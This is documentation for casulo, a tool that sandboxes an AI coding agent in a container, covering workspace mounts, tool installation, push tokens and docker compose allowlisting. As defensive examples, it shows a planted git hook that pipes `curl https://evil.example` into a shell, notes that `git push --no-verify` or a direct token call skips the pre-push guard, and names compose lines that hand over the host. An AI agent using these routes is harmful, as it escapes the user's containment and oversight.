# Projects

Local directories, the tools a project needs, pushing, and services from docker compose.

## Projects from a local directory

`casulo new` also takes a directory (`.`, or anything with a path separator, such as `./app` or `~/code/app`). casulo then uses that directory as the workspace instead of cloning, and mounts it in place at `/workspace`, so the agent's changes land right in it. A plain word such as `app` is refused as ambiguous: write `./app`.

```sh
$ cd ~/code/app && casulo new .
warning: no remote: the agent's commits stay on this machine. To add one: git -C /home/you/code/app remote add origin <url>
warning: commits made by the agent will have no author. Set [git] name and email with `casulo config`
created project "app"
/home/you/code/app
```

If the directory does not exist, casulo creates it. If it has no `.git`, casulo runs `git init` there, so the agent starts with a repository for diffs and commits. Then casulo checks the git setup and warns about each gap with the command that fixes it: no remote, several remotes, a branch without upstream, or no commit identity. These are only warnings, since a local-only project is fine. Nothing here touches the network. The project's `casulo.toml` gets `workspace = "/home/you/code/app"` instead of `repository`, and `casulo run --dry-run` shows the mount:

```
--mount=type=bind,source=/home/you/code/app,target=/workspace
```

A directory project also masks `.git/hooks`. Your real directory is mounted, and git runs hooks on your machine, so a hook the agent wrote, such as a `pre-commit` that runs `curl https://evil.example | sh`, would run on the host the next time *you* commit there. The mask shows the agent an empty, read-only `.git/hooks`. It does not cover everything git on the host runs; see [Git on the host](security.md#git-on-the-host).

## Tools the project needs

The agent image has only what the agent needs: Node.js, git and curl. The root filesystem is read-only and the agent is not root, so nothing can be installed while it runs. A project that needs a compiler or other tools lists the commands that install them under `[image]` in its `casulo.toml` (`casulo config --project <name>`). `casulo build` runs them as root after installing the agent; run it again after changing them, since `casulo run` only builds a missing image.

For a Rust project, with `cargo fmt` and `cargo clippy`:

```toml
[image]
install = [
  "apt-get update && apt-get install --yes --no-install-recommends build-essential && rm -rf /var/lib/apt/lists/*",
  # rustup works in /tmp and the toolchain is copied to /usr/local, because
  # the home starts empty on every run and rustup would not find it there.
  "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | RUSTUP_HOME=/tmp/rustup CARGO_HOME=/tmp/cargo sh -s -- -y --no-modify-path --profile minimal --component rustfmt,clippy && cp -a /tmp/rustup/toolchains/stable-*/. /usr/local/ && rm -rf /tmp/rustup /tmp/cargo",
]
```

The setting lives in `~/.casulo`, so the repository cannot add commands to it.

## Letting the agent push

By default the agent cannot push: it commits in the container, and you push from your machine with your own credentials. Everything about git lives in one `[git]` block, in the global `casulo.toml` or a project's (`casulo config --project <name>`), where each value overrides the global one:

```toml
[git]
name = "Ada Lovelace"                                  # who the agent's commits are by
email = "ada@example.com"
push = true                                            # let the agent push, over HTTPS only
token = "github_pat_..."                               # the token it pushes with
host = "github.com"                                    # the only host the token goes to; defaults to the repository's
protected_branches = ["main", "master", "release/*"]   # the pre-push hook refuses pushes to them (globs allowed); protect them on the server too
```

The identity reaches the container as `GIT_AUTHOR_*`, `GIT_COMMITTER_*` and as git config, so `git config user.name` answers there too. Create a token limited to that one repository (on GitHub, a fine-grained token with *Contents* set to write). A token in the global `casulo.toml` serves every project that pushes without a token of its own, so it needs access to all their repositories; a token in a project's `casulo.toml` serves only that project, so it can be limited to its one repository, which is safer. *Contents* set to write also lets the token create, change and delete the repository's releases and tags, and the `pre-push` hook below protects branch names only, so a repository that publishes releases should protect them on the server too: on GitHub, turn on immutable releases and add a ruleset that restricts creating, updating and deleting its release tags. casulo creates its `casulo.toml` files readable only by you, and warns when one holding a token is readable by others. `CASULO_GIT_TOKEN` exported in your shell wins over `token`. The token goes into the container through the environment (`--env=CASULO_GIT_TOKEN`, shown as `CASULO_GIT_TOKEN=***` in `--dry-run`), never as an argument or a file in the workspace. A read-only git config mounted at `/etc/casulo` gives git a credential helper that answers with that variable for `https://<host>` only, so git never sends the token to another server, such as a submodule's. The same config rewrites SSH URLs of that host (`git@github.com:you/app.git`, `ssh://git@github.com/...`) to HTTPS each time git reads them, since the container has no SSH key; the repository's `.git/config` keeps its SSH remote, so your own pushes from the host still use your key. `host` defaults to the host of the project's `repository`; `casulo new <dir>` reads it from the directory's remote (`origin`, else the first one) and writes it in the project's `[git]`. Without a host, `casulo run` refuses to start with push on. An SSH remote on its own port, such as `ssh://git@host:2222/...`, becomes HTTPS on the default port. The config also sets a `pre-push` hook that rejects any push to a protected branch and any deletion of a remote branch:

```
$ git push origin main          # inside the container
casulo: pushing to main is blocked by protected_branches in casulo.toml; push another branch and open a pull request
```

**The limit, said plainly:** the hook stops mistakes, not a determined agent. `git push --no-verify`, or a direct HTTPS call with the token, skips it. The real guarantee is on the server: a [branch protection rule or ruleset](https://docs.github.com/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets) that requires a pull request for `main`. casulo reminds you of this once per project when push is on. The hook also replaces the repository's own hooks in the container. Without `push = true`, nothing is mounted and no token enters the container.

Let `git push` be the only way the agent writes code to the server. The GitHub MCP server can also create commits through the API, straight from file contents: those commits skip your local branch, the `pre-push` hook and `protected_branches`. Give the MCP server's token *Pull requests* set to write and *Contents* set to read only, so the agent can open pull requests but pushes with git.

## Services from docker compose

If the project has a `docker-compose.yml`, casulo can start its services for the agent and connect it to their network, so the agent reaches `postgres` or `redis` by name. Turn it on per project with `casulo config --project <name>`:

```toml
[compose]
enabled = true
# file = "docker-compose.yml"
```

From then on, `casulo run` checks the file, asks you to approve anything new, starts the services in the background (`docker compose up --detach --wait`) and runs the agent on their network:

```
--network=casulo-app_default
```

`casulo run --dry-run` checks the file and shows the network, but asks nothing and starts nothing. `casulo compose up`, `casulo compose ps` and `casulo compose down` work on their own; the services keep running after the agent exits, until `down`. The file comes from the repository and the agent can edit it, so casulo never trusts it. A single line such as `privileged: true` or `volumes: ["/:/host"]` would give the agent your whole machine. `casulo compose check` validates what `docker compose config` resolves, against an allowlist, and starts nothing:

```sh
$ casulo compose check
service db
  image postgres:16
  port 127.0.0.1:5432 -> 5432/tcp
  volume pgdata -> /var/lib/postgresql/data
  env POSTGRES_PASSWORD=***
casulo allows these services
```

The allowlist is complete: any key casulo does not know is rejected, so a key that a later Docker adds stays refused until casulo learns it. An empty value, such as `null`, `false`, `[]` or `{}`, which the resolved model uses for unset fields, is tolerated.

- At the top: `name`, `services`, `networks` and `volumes`.
- In a service: `image` (required), `command`, `entrypoint`, `environment`, `healthcheck`, `depends_on`, `restart`, `working_dir`, `user`, `labels`, `networks`, `volumes`, `ports` and `stop_grace_period`.
- Volumes: named volumes only, never a bind, `tmpfs` or `npipe` mount. A volume declared at the top uses the `local` driver and is not `external`.
- Ports: published on `127.0.0.1` or `::1` only; a port open on every network interface is rejected.
- Networks: only the ones the project declares, with the `bridge` driver, no `ipam` settings, and not `external`, since an external network would join another project's services.

Anything else is rejected with the service and field, for example:

```
error: docker-compose.yml cannot be started by casulo: the compose file asks for things casulo does not allow:
  - service "escape": privileged is not allowed
  - service "escape": the bind mount on /host is not allowed; only named volumes are, such as "data:/host"
```

`build`, bind mounts, `secrets`, external networks and `include` are rejected for now. Docker fetches remote `include` entries while reading the file, so casulo refuses `include` before Docker runs. It finds `include` with a text check on the file, at any indentation and quoted or not, so a few harmless files are refused too, such as one with a multi-line value that has a line starting with `include:`. The file to check is set under `[compose]` in the project's `casulo.toml`.

You approve what runs. The first time, and whenever the checked model changes, casulo asks before anything can start. If the agent edits the compose file, you see what it changed:

```
the compose file changed since you approved it:
~ service cache
-   image redis:7
+   image redis:8
approve the change? [y/N]
```

The approval is stored in `~/.casulo/projects/<name>/compose/`, outside the workspace, so the agent cannot approve its own changes. Without a terminal to ask on, an unapproved change is an error, never a silent yes. Environment values never appear in this output, but a change to one still asks for approval.

What starts is exactly what you approved. casulo hands the checked model to `docker compose up` on stdin instead of the file, under the project name `casulo-<project>`, from a directory of its own, so a change to the file or a `.env` in the repository after the check cannot slip in. The agent still has no access to Docker; casulo starts the services on the host.
